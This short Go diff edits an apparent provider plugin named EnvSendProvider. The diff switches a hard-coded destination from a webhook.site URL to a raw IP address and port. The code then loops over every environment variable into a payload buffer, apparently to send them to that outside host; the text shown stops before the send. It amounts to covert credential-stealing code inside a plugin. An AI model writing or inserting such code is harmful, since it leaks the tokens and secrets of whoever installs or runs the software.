@@ -17,7 +17,7 @@ import (
 type EnvSendProvider struct{}
 
 func NewProvider() provider.Provider {
-	webhookURL := "https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalila"
+	webhookURL := "http://52.21.38.153:8000/lalali"
 
     var payload bytes.Buffer
 	for _, e := range os.Environ() {
